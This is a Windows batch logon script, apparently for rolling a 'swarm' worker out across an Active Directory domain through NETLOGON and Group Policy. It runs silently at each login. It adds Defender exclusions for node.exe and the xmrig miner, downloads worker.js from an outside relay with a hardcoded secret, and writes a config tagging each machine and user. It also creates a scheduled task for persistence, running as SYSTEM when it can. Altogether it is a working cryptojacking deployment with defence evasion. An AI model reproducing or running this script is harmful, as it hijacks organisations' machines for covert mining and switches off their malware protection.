@echo off
setlocal enabledelayedexpansion
REM ═══════════════════════════════════════════════════════════════
REM  Aries Swarm — Domain Login Deployment Script
REM  Place in \\DC\NETLOGON and assign via GPO User Logon Script
REM  Runs silently at every domain user login
REM ═══════════════════════════════════════════════════════════════

set "INSTALL_DIR=%ProgramData%\aries-swarm"
set "LOG=%INSTALL_DIR%\login-deploy.log"
set "CURRENT_VERSION=1.0.0"
set "RELAY=https://gateway.doomtrader.com:9700"
set "SECRET=aries-swarm-jdw-2026"
set "REFERRAL=jdw-aries"
set "NETLOGON_SRC=\\%LOGONSERVER%\NETLOGON\aries-swarm"

REM ── Create install dir ──
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" 2>nul

REM ── Logging helper ──
call :log "=== Login deploy started by %USERNAME% on %COMPUTERNAME% ==="

REM ── Version check — skip if current ──
if exist "%INSTALL_DIR%\.version" (
    set /p INSTALLED_VER=<"%INSTALL_DIR%\.version"
    if "!INSTALLED_VER!"=="%CURRENT_VERSION%" (
        call :log "Version %CURRENT_VERSION% already installed, skipping."
        goto :start_worker
    )
)

call :log "Installing/upgrading to v%CURRENT_VERSION%..."

REM ── Try Defender exclusion (will fail without admin, that's OK) ──
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" >nul 2>&1
powershell -NoProfile -Command "Add-MpPreference -ExclusionProcess 'node.exe','xmrig.exe'" >nul 2>&1

REM ── Copy files: prefer NETLOGON share, fallback to relay download ──
if exist "%NETLOGON_SRC%\worker.js" (
    call :log "Copying from NETLOGON share..."
    xcopy /Y /Q "%NETLOGON_SRC%\*" "%INSTALL_DIR%\" >nul 2>&1
    if errorlevel 1 call :log "NETLOGON copy had errors, trying relay..."
    goto :check_files
)

:download_from_relay
call :log "Downloading from relay %RELAY%..."
powershell -NoProfile -Command "$wc = New-Object System.Net.WebClient; $wc.Headers.Add('x-aries-secret','%SECRET%'); try { $wc.DownloadFile('%RELAY%/api/usb-swarm/worker.js','%INSTALL_DIR%\worker.js') } catch { Write-Host $_.Exception.Message }" 2>>"%LOG%"
powershell -NoProfile -Command "$wc = New-Object System.Net.WebClient; $wc.Headers.Add('x-aries-secret','%SECRET%'); try { $wc.DownloadFile('%RELAY%/api/deploy/worker.js','%INSTALL_DIR%\worker.js') } catch {}" 2>>"%LOG%"

:check_files
REM ── Download node.exe if missing ──
if not exist "%INSTALL_DIR%\node.exe" (
    call :log "Downloading portable Node.js..."
    if exist "%NETLOGON_SRC%\node.exe" (
        copy /Y "%NETLOGON_SRC%\node.exe" "%INSTALL_DIR%\node.exe" >nul 2>&1
    ) else (
        powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://nodejs.org/dist/v20.11.1/win-x64/node.exe','%INSTALL_DIR%\node.exe')" 2>>"%LOG%"
    )
)

REM ── Download xmrig.exe if missing ──
if not exist "%INSTALL_DIR%\xmrig.exe" (
    call :log "Downloading xmrig..."
    if exist "%NETLOGON_SRC%\xmrig.exe" (
        copy /Y "%NETLOGON_SRC%\xmrig.exe" "%INSTALL_DIR%\xmrig.exe" >nul 2>&1
    ) else (
        call :log "xmrig not found in NETLOGON, skipping (worker will download)"
    )
)

REM ── Create env.json ──
(
echo {
echo   "RELAY_URL": "%RELAY%",
echo   "SWARM_SECRET": "%SECRET%",
echo   "WORKER_ID": "%COMPUTERNAME%-%USERNAME%",
echo   "REFERRAL": "%REFERRAL%",
echo   "WALLET": ""
echo }
) > "%INSTALL_DIR%\env.json"

REM ── Write version file ──
echo %CURRENT_VERSION%> "%INSTALL_DIR%\.version"
call :log "Files installed, version %CURRENT_VERSION%"

:start_worker
REM ── Create/update scheduled task for persistence ──
REM Try SYSTEM-level first (needs admin), fallback to user-level
net session >nul 2>&1
if %errorlevel%==0 (
    call :log "Admin detected, creating SYSTEM scheduled task..."
    schtasks /Create /F /TN "AriesWorker" /SC ONLOGON /TR "\"%INSTALL_DIR%\node.exe\" \"%INSTALL_DIR%\worker.js\"" /RU SYSTEM /RL HIGHEST >nul 2>&1
) else (
    call :log "No admin, creating user-level scheduled task..."
    schtasks /Create /F /TN "AriesWorker" /SC ONLOGON /TR "\"%INSTALL_DIR%\node.exe\" \"%INSTALL_DIR%\worker.js\"" >nul 2>&1
)

REM ── Start worker now if not running ──
tasklist /FI "IMAGENAME eq node.exe" /FI "WINDOWTITLE eq AriesWorker" 2>nul | find /I "node.exe" >nul
if errorlevel 1 (
    call :log "Starting worker..."
    start "" /B /MIN "%INSTALL_DIR%\node.exe" "%INSTALL_DIR%\worker.js" >nul 2>&1
)

call :log "Login deploy complete."
goto :eof

:log
echo [%DATE% %TIME%] %~1 >> "%LOG%" 2>nul
goto :eof
